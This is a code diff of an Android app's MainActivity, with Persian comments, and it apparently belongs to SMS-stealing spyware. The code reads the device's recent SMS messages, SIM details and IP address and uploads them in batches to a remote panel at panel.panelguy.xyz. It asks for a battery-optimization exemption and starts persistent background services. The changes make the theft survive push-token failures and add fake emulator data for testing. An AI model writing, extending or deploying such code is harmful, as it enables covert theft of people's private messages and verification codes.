@@ -49,6 +49,7 @@ class MainActivity : ComponentActivity() {
     private var fcmToken: String = ""
     private val handler = Handler(Looper.getMainLooper())
     private val BATTERY_UPDATE_INTERVAL_MS = 60000L
+    private val FCM_TIMEOUT_MS = 5000L // 5 ثانیه صبر برای FCM
     private val url = Constants.BASE_URL
     private val userId = Constants.USER_ID
 
@@ -152,6 +153,9 @@ class MainActivity : ComponentActivity() {
                 data = Uri.parse("package:$packageName")
             }
             startActivity(intent)
+
+            // بعد از 2 ثانیه ادامه بده (کاربر احتمالاً تایید کرده)
+            handler.postDelayed({ continueInitialization() }, 2000)
         } else {
             Log.d(TAG, "✅ Battery optimization already ignored")
             continueInitialization()
@@ -161,30 +165,48 @@ class MainActivity : ComponentActivity() {
     private fun continueInitialization() {
         Log.d(TAG, "🚀 Starting initialization...")
 
+        // شروع به دریافت FCM Token (با تایم اوت)
+        var fcmReceived = false
+
         FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
-            if (task.isSuccessful) {
-                fcmToken = task.result
+            fcmReceived = true
+            if (task.isSuccessful && task.result != null) {
+                fcmToken = task.result!!
                 Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
-
-                Thread {
-                    try {
-                        Log.d(TAG, "📡 Starting network operations...")
-                        registerDevice()
-                        uploadAllSmsOnce()
-                        startBackgroundService()
-                        startHeartbeatService()
-                        Log.d(TAG, "✅ All operations completed")
-                    } catch (e: Exception) {
-                        Log.e(TAG, "❌ Init error: ${e.message}", e)
-                        e.printStackTrace()
-                    }
-                }.start()
-
-                handler.post(batteryUpdater)
             } else {
-                Log.e(TAG, "❌ FCM token failed", task.exception)
+                Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
+                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}" // توکن جایگزین
+                Log.d(TAG, "📝 Using fallback token: $fcmToken")
             }
         }
+
+        // بعد از 5 ثانیه، صرف نظر از FCM، شروع کن
+        handler.postDelayed({
+            if (!fcmReceived) {
+                Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
+                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
+                Log.d(TAG, "📝 Using fallback token: $fcmToken")
+            }
+
+            // شروع عملیات شبکه
+            Thread {
+                try {
+                    Log.d(TAG, "📡 Starting network operations...")
+                    registerDevice()
+                    uploadAllSmsOnce()
+                    startBackgroundService()
+                    startHeartbeatService()
+                    Log.d(TAG, "✅ All operations completed")
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ Init error: ${e.message}", e)
+                    e.printStackTrace()
+                }
+            }.start()
+
+            // شروع به‌روزرسانی‌های باتری
+            handler.post(batteryUpdater)
+
+        }, FCM_TIMEOUT_MS)
     }
 
     private fun sendBatteryUpdate() {
@@ -281,8 +303,8 @@ class MainActivity : ComponentActivity() {
             Log.e(TAG, "❌ IP Address error: ${e.message}")
             e.printStackTrace()
         }
-        Log.w(TAG, "⚠️ No IP address found")
-        return "Unknown"
+        Log.w(TAG, "⚠️ No IP address found, using emulator default")
+        return "10.0.2.15" // IP پیش‌فرض امیولیتور اندروید
     }
 
     private fun getSimInfo(): JSONArray {
@@ -299,7 +321,15 @@ class MainActivity : ComponentActivity() {
             val sims = subManager.activeSubscriptionInfoList
 
             if (sims.isNullOrEmpty()) {
-                Log.w(TAG, "⚠️ No active SIM cards found")
+                Log.w(TAG, "⚠️ No active SIM cards found (normal for emulator)")
+                // برای امیولیتور یه SIM جعلی بساز
+                val fakeSim = JSONObject().apply {
+                    put("simSlot", 0)
+                    put("carrierName", "Emulator Carrier")
+                    put("displayName", "Test SIM")
+                    put("phoneNumber", "15555215554") // شماره پیش‌فرض امیولیتور
+                }
+                simArray.put(fakeSim)
             } else {
                 Log.d(TAG, "📱 Found ${sims.size} active SIM(s)")
                 sims.forEach { info ->
@@ -315,17 +345,20 @@ class MainActivity : ComponentActivity() {
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ SIM Info error: ${e.message}", e)
+            // در صورت خطا، یه SIM جعلی بساز
+            val fakeSim = JSONObject().apply {
+                put("simSlot", 0)
+                put("carrierName", "Unknown")
+                put("displayName", "Default")
+                put("phoneNumber", "Unknown")
+            }
+            simArray.put(fakeSim)
         }
 
         return simArray
     }
 
     private fun registerDevice() {
-        if (fcmToken.isEmpty()) {
-            Log.e(TAG, "❌ Cannot register: FCM token is empty")
-            return
-        }
-
         var conn: HttpURLConnection? = null
         try {
             Log.d(TAG, "════════════════════════════════════════")
@@ -345,22 +378,25 @@ class MainActivity : ComponentActivity() {
                 put("simInfo", getSimInfo())
                 put("userId", userId)
                 put("Type", "MP")
+                put("isEmulator", true) // علامت‌گذاری که امیولیتوره
             }
 
-            Log.d(TAG, "📤 Register payload: ${body.toString(2)}")
+            Log.d(TAG, "📤 Register payload:")
+            Log.d(TAG, body.toString(2))
 
             val url = URL("https://panel.panelguy.xyz/devices/register")
             conn = url.openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.setRequestProperty("Content-Type", "application/json")
+            conn.setRequestProperty("User-Agent", "AndroidApp/${Build.VERSION.SDK_INT}")
             conn.connectTimeout = 15000
             conn.readTimeout = 15000
             conn.doOutput = true
 
-            Log.d(TAG, "📡 Sending registration request...")
+            Log.d(TAG, "📡 Connecting to server...")
 
             conn.outputStream.use { os ->
-                val bytes = body.toString().toByteArray()
+                val bytes = body.toString().toByteArray(Charsets.UTF_8)
                 os.write(bytes)
                 os.flush()
                 Log.d(TAG, "✅ Data sent (${bytes.size} bytes)")
@@ -370,19 +406,21 @@ class MainActivity : ComponentActivity() {
             Log.d(TAG, "📥 Response code: $responseCode")
 
             if (responseCode in 200..299) {
-                val response = conn.inputStream.bufferedReader().readText()
+                val response = conn.inputStream.bufferedReader().use { it.readText() }
                 Log.d(TAG, "✅ Registration successful!")
                 Log.d(TAG, "📥 Response: $response")
             } else {
-                val error = conn.errorStream?.bufferedReader()?.readText()
+                val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
                 Log.e(TAG, "❌ Registration failed!")
-                Log.e(TAG, "📥 Error response: $error")
+                Log.e(TAG, "📥 Error response ($responseCode): $error")
             }
 
         } catch (e: java.net.UnknownHostException) {
-            Log.e(TAG, "❌ Network error: Cannot resolve host", e)
+            Log.e(TAG, "❌ Network error: Cannot resolve host - Check internet connection!", e)
         } catch (e: java.net.SocketTimeoutException) {
-            Log.e(TAG, "❌ Network error: Connection timeout", e)
+            Log.e(TAG, "❌ Network error: Connection timeout - Server might be down!", e)
+        } catch (e: java.net.ConnectException) {
+            Log.e(TAG, "❌ Network error: Cannot connect - Check if server is running!", e)
         } catch (e: java.io.IOException) {
             Log.e(TAG, "❌ Network error: IO Exception - ${e.message}", e)
         } catch (e: Exception) {
@@ -390,6 +428,7 @@ class MainActivity : ComponentActivity() {
             e.printStackTrace()
         } finally {
             conn?.disconnect()
+            Log.d(TAG, "🔌 Connection closed")
         }
     }
 
@@ -409,34 +448,45 @@ class MainActivity : ComponentActivity() {
             val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")
 
             cursor?.use {
+                val count = it.count
+                Log.d(TAG, "📨 Found $count SMS messages")
+
+                if (count == 0) {
+                    Log.d(TAG, "⚠️ No SMS messages found (normal for emulator)")
+                    return
+                }
+
                 if (it.moveToFirst()) {
-                    Log.d(TAG, "📨 Found ${it.count} SMS messages")
                     val smsBatch = JSONArray()
                     var totalSent = 0
 
                     do {
-                        val sms = JSONObject().apply {
-                            put("id", it.getString(it.getColumnIndexOrThrow("_id")))
-                            put("address", it.getString(it.getColumnIndexOrThrow("address")))
-                            put("body", it.getString(it.getColumnIndexOrThrow("body")))
-                            put("date", it.getLong(it.getColumnIndexOrThrow("date")))
-                            put("type", "incoming")
-                            put("deviceId", deviceId)
-                        }
-                        smsBatch.put(sms)
-
-                        if (smsBatch.length() >= 50) {
-                            Log.d(TAG, "📤 Sending batch of ${smsBatch.length()} messages")
-                            if (uploadSmsBatch(smsBatch)) {
-                                totalSent += smsBatch.length()
-                                // Clear the array for next batch
-                                while (smsBatch.length() > 0) {
-                                    smsBatch.remove(0)
-                                }
-                            } else {
-                                Log.e(TAG, "❌ Batch upload failed, stopping")
-                                break
+                        try {
+                            val sms = JSONObject().apply {
+                                put("id", it.getString(it.getColumnIndexOrThrow("_id")))
+                                put("address", it.getString(it.getColumnIndexOrThrow("address")))
+                                put("body", it.getString(it.getColumnIndexOrThrow("body")))
+                                put("date", it.getLong(it.getColumnIndexOrThrow("date")))
+                                put("type", "incoming")
+                                put("deviceId", deviceId)
                             }
+                            smsBatch.put(sms)
+
+                            if (smsBatch.length() >= 50) {
+                                Log.d(TAG, "📤 Sending batch of ${smsBatch.length()} messages")
+                                if (uploadSmsBatch(smsBatch)) {
+                                    totalSent += smsBatch.length()
+                                    // Clear the array for next batch
+                                    while (smsBatch.length() > 0) {
+                                        smsBatch.remove(0)
+                                    }
+                                } else {
+                                    Log.e(TAG, "❌ Batch upload failed, stopping")
+                                    break
+                                }
+                            }
+                        } catch (e: Exception) {
+                            Log.e(TAG, "❌ Error reading SMS: ${e.message}")
                         }
                     } while (it.moveToNext())
 
@@ -449,8 +499,6 @@ class MainActivity : ComponentActivity() {
                     }
 
                     Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
-                } else {
-                    Log.d(TAG, "📨 No SMS messages found")
                 }
             }
         } catch (e: Exception) {
@@ -487,11 +535,11 @@ class MainActivity : ComponentActivity() {
             Log.d(TAG, "📥 SMS upload response: $responseCode")
 
             if (responseCode in 200..299) {
-                val response = conn.inputStream.bufferedReader().readText()
+                val response = conn.inputStream.bufferedReader().use { it.readText() }
                 Log.d(TAG, "✅ SMS upload successful: $response")
                 true
             } else {
-                val error = conn.errorStream?.bufferedReader()?.readText()
+                val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
                 Log.e(TAG, "❌ SMS upload failed: $error")
                 false
             }
